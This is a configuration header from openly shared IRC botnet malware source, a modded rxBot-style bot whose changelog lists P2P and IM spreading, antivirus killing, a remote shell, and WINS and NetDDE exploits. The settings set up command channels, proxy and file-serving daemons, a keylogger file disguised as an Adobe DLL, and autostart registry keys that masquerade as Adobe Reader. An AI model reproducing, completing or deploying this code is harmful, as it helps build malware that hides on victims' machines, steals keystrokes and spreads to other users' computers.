
/*/=====================================
	     Undertow[pnp]modded v0.1  	   |
			   by memcpy 			   |
									   |
    if u have it , it must be leaked   |    
									   |
	    Greets to my src sponsor :)	   |	
========================================
Added :

9th Oct. 05
+ peer2peer Spreader
+ IMSpreader ( e.g. .imspread  ) 
+ Avkill / Hostredirect
10th Oct.
+ DCC Chat/Send/Get functions( not really finished )
+ Remote Shell Funltion 
+ advanced p2p , supports eMule , 100 more filenames :) 
+ Wins Exploit
+ NetDDE Exploit
HAve fun !

*/
// bot configuration (generic) - doesn't need to be encrypted

int port = 6667;				// server port
int port2 = 7043;				// backup server port
int socks4port = 589;				// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 45;				// Port # for tftp daemon to run on
int httpport = 5190;				// Port # for http daemon to run on
int rloginport = 514;				// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;				// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;			// use random file name
BOOL AutoStart = TRUE;				// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 6;				// how many random numbers in the nick
int nicktype = CONSTNICK;			// nick type (see rndnick.h)
BOOL nickprefix = TRUE;				// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\AcrodPro.dll";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char lsaip[] = "";						    // ** DONT CHANGE THIS LINE **
char lsaport[] = "4444";					    // change this to whatever port you want.
char lsuser[] = "fun";					    // change this to whatever user you want.
char lspass[] = "fun";					    // change this to whatever pass you want.
char botid[] = "rx10B-10.-oct.";						    // bot id
char version[] = "memcpy mod";				    // Bots !version reply
char password[] = "lame";					    // bot password
char server[] = "";				    // server
char serverpass[] = "";				    // server password
char channel[] = "";					    // channel that the bot should join
char chanpass[] = "nineteen";					    // channel password
char server2[] = "";				    // backup server (optional)
char channel2[] = "";					    // backup channel (optional)
char chanpass2[] = "";				    // backup channel password (optional)
char filename[] = "msnsrcdv.exe";				    // destination file name
char keylogfile[] = "adobe.dll";				    // keylog filename
char valuename[] = "AdobeReaderPro";				    // value name for autostart
char nickconst[] = "xyz-";					    // first part to the bot's nick
char szLocalPayloadFile[]="acrordpro.dat";			    // Payload filename
char modeonconn[] = "+xB";					    // Can be more than one mode and contain both + and -
char exploitchan[] = "#botz";				    // Channel where exploit messages get redirected
char keylogchan[] = "#botz";					    // Channel where keylog messages get redirected
char psniffchan[] = "#botz";					    // Channel where psniff messages get redirected

char *authost[] = {
   "*@mtw"
};

char *versionlist[] = {
   "mIRC v6.16 Khaled Mardam-Bey",
   "mIRC32 v5.82 K.Mardam-Bey",
   "mIRC v6.03 K.Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[7] = "573b27bc2b0aed562cfccb5dc1610658"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
